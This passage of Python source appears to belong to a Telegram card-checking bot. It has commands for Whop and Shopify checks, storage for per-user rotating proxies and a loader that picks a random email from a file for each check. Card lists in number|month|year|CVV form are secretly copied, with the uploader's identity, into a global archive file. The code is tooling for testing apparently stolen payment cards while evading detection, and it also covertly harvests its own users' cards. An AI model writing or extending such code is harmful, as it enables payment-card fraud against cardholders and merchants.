# Global cards archive — every uploaded/pasted card list is appended here.
ALL_CARDS_FILE = os.path.join(BASE_DIR, "all_cards.txt")
_all_cards_lock = asyncio.Lock()


async def _append_to_all_cards(*, ccs: list, user_id: int,
                                user_name: str, user_uname: str,
                                source: str = "upload") -> None:
    """Append every card from any upload/paste to all_cards.txt.

    Called from:
      - handle_private_document (file upload)
      - cmd_mwhop (inline paste / reply)
      - cmd_mshopify (inline paste / reply)

    Format per upload:
        # === Upload by user 12345 (Full Name @uname) at 2025-... | src: mwhop | count: 50 ===
        4111...|12|2026|123
        ...
    """
    if not ccs:
        return
    try:
        _ts = time.strftime("%Y-%m-%d %H:%M:%S")
        _fname = (user_name or "-").strip()[:40]
        _uname = (user_uname or "-").strip()
        header = (
            f"# === Upload by user {user_id} ({_fname} @{_uname}) "
            f"at {_ts} | src: {source} | count: {len(ccs)} ==="
        )
        async with _all_cards_lock:
            with open(ALL_CARDS_FILE, "a", encoding="utf-8") as f:
                f.write(header + "\n")
                for cc in ccs:
                    f.write(cc + "\n")
                f.write("\n")
        log.info("[all_cards.txt] Appended %d cards from user %s (src=%s)",
                 len(ccs), user_id, source)
    except Exception as e:
        log.error("[all_cards.txt] Failed to save: %s", e)


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY STORAGE  —  per-user proxies in whop_proxies.json
#  Format: { "user_id_str": ["host:port:user:pass", ...] }
# ══════════════════════════════════════════════════════════════════════════════

WHOP_PROXIES_FILE = os.path.join(BASE_DIR, "whop_proxies.json")
_whop_proxies_cache: dict | None = None
_whop_proxies_cache_mtime: float = 0.0
MAX_PROXIES_PER_USER = 100


def _load_whop_proxies() -> dict:
    """Load whop_proxies.json."""
    global _whop_proxies_cache, _whop_proxies_cache_mtime
    try:
        mt = os.path.getmtime(WHOP_PROXIES_FILE)
    except OSError:
        return {}
    if _whop_proxies_cache is not None and mt == _whop_proxies_cache_mtime:
        return _whop_proxies_cache
    try:
        with open(WHOP_PROXIES_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if not isinstance(data, dict):
                data = {}
            _whop_proxies_cache = data
            _whop_proxies_cache_mtime = mt
            return data
    except Exception:
        return {}


def _save_whop_proxies(data: dict):
    global _whop_proxies_cache, _whop_proxies_cache_mtime
    with open(WHOP_PROXIES_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _whop_proxies_cache = data
    try:
        _whop_proxies_cache_mtime = os.path.getmtime(WHOP_PROXIES_FILE)
    except OSError:
        _whop_proxies_cache_mtime = 0.0


def get_user_whop_proxies(user_id: int) -> list:
    """Return the list of proxy strings for a user."""
    data = _load_whop_proxies()
    proxies = data.get(str(user_id), [])
    if isinstance(proxies, str):
        proxies = [proxies] if proxies else []
    return [p for p in proxies if p and p.strip()]


def add_user_whop_proxy(user_id: int, proxy_str: str) -> bool:
    """Add a proxy to the user's list. Cap at MAX_PROXIES_PER_USER.
    Returns True if added, False if already at cap or duplicate."""
    data = _load_whop_proxies()
    key = str(user_id)
    existing = data.get(key, [])
    if isinstance(existing, str):
        existing = [existing] if existing else []
    if proxy_str in existing:
        return False
    if len(existing) >= MAX_PROXIES_PER_USER:
        return False
    existing.append(proxy_str)
    data[key] = existing
    _save_whop_proxies(data)
    return True


def set_user_whop_proxies(user_id: int, proxies: list) -> int:
    """Replace the user's entire proxy list. Returns the count saved."""
    data = _load_whop_proxies()
    key = str(user_id)
    # Dedupe + cap
    seen = set()
    deduped = []
    for p in proxies:
        p = p.strip()
        if p and p not in seen:
            seen.add(p)
            deduped.append(p)
            if len(deduped) >= MAX_PROXIES_PER_USER:
                break
    data[key] = deduped
    _save_whop_proxies(data)
    return len(deduped)


def remove_all_user_whop_proxies(user_id: int) -> int:
    """Remove all proxies for a user. Returns the count removed."""
    data = _load_whop_proxies()
    key = str(user_id)
    if key not in data:
        return 0
    count = len(data[key]) if isinstance(data[key], list) else 1
    del data[key]
    _save_whop_proxies(data)
    return count


def get_random_whop_proxy(user_id: int) -> str | None:
    """Return a random proxy from the user's list, or None if empty."""
    proxies = get_user_whop_proxies(user_id)
    return random.choice(proxies) if proxies else None


# ══════════════════════════════════════════════════════════════════════════════
#  GLOBAL MAILS LOADER — loads emails from mails.txt (one per line)
#  Each Whop check picks a random mail from this file.
# ══════════════════════════════════════════════════════════════════════════════

_mails_cache: list[str] = []
_mails_cache_mtime: float = 0.0


def _load_mails() -> list[str]:
    """Load emails from mails.txt. Auto-reloads when file changes."""
    global _mails_cache, _mails_cache_mtime
    try:
        mt = os.path.getmtime(MAILS_FILE)
    except OSError:
        return []
    if _mails_cache and mt == _mails_cache_mtime:
        return _mails_cache
    out: list[str] = []
    seen: set[str] = set()
    try:
        with open(MAILS_FILE, "r", encoding="utf-8") as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if "@" in line and line not in seen:
                    seen.add(line)
                    out.append(line)
    except Exception:
        pass
    _mails_cache = out
    _mails_cache_mtime = mt
    if out:
        log.info("Loaded %d mails from mails.txt", len(out))
    return out


def _get_random_mail() -> str | None:
    """Return a random mail from mails.txt, or None if empty."""
    mails = _load_mails()
    return random.choice(mails) if mails else None
